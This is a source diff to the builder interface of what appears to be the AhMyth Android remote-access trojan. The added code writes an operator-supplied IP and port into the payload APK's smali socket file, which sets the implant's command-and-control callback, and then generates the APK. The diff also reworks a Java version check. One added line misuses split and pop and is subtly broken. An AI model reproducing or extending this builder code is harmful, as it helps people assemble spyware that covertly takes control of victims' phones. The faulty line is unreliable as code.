@@ -920,8 +920,10 @@ app.controller("AppCtrl", ($scope) => {
         // Check Java version before proceeding
         checkJavaVersion((error, javaVersion) => {
             if (error) {
-                // If Java version is not 11 or not installed, throw an error
                 $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
+                return;
+            } else if (javaVersion !== 11) {
+                $appCtrl.Log(`[x] Wrong Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
                 return;
             } else {
                 if (!ip) {
@@ -934,7 +936,33 @@ app.controller("AppCtrl", ($scope) => {
 
                 // check if bind apk is enabled
                 if (!$appCtrl.bindApk.enable) {
-                    $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
+                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
+                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
+                        if (error) {
+                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
+                            writeErrorLog(error, 'IP:PORT');
+                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
+                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                            return;
+                        }
+
+                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
+                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
+                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');
+
+                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
+                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
+                            if (error) {
+                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
+                                writeErrorLog(error, 'IP:PORT');
+                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
+                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
+                                return;
+                            }
+                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+                        });
+                    });
                 } else {
                     var filePath = $appCtrl.filePath;
                     if (!filePath) {
@@ -1003,24 +1031,21 @@ app.controller("AppCtrl", ($scope) => {
 
 // Function to check if Java version 11 is installed
 function checkJavaVersion(callback) {
-    exec('java -version', (error, stdout, stderr) => {
-        if (error) {
-            callback(new Error('Java is not installed or not accessible.'));
-        } else {
-            const versionOutput = stderr || stdout;
-            const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
-            if (versionMatch) {
-                const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
-                if (majorVersion === 11) {
+    exec('java -version',
+        (error, stdout, stderr) => {
+            if (error) {
+                callback(new Error('Java is not installed or not accessible.'));
+            } else {
+                const versionOutput = stderr || stdout;
+                const versionMatch = versionOutput.match(/version "(\d+)\.(\d+)\.|version "(\d+)\-internal"/);
+                if (versionMatch) {
+                    const majorVersion = parseInt(versionMatch[1] || versionMatch[3], 10);
                     callback(null, majorVersion);
                 } else {
-                    callback(new Error('Wrong Java Version Installed, Please install Java 11!'));
+                    callback(new Error('Java is not installed or not accessible.'));
                 }
-            } else {
-                callback(new Error('Java is not Installed or not Accessible.'));
             }
-        }
-    });
+        });
 }
 
 // function to delay logs by 0300
@@ -1028,7 +1053,8 @@ function delayedLog(msg, status) {
     let count = delayedLog.count = (delayedLog.count || 0) + 1;
     setTimeout(() => {
         $appCtrl.Log(msg, status);
-    }, count * 0o300);
+    },
+        count * 0o300);
 };
 
 function writeErrorLog(errorMessage, errorType) {
